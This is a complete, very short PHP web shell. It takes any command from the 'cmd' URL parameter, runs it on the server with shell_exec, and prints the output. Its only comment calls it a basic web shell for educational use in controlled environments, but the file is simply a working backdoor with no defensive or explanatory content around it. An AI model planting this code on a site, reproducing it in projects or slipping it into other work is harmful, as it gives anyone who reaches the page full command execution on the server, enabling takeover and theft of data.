<?php
// Basic PHP web shell for educational use in controlled environments
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
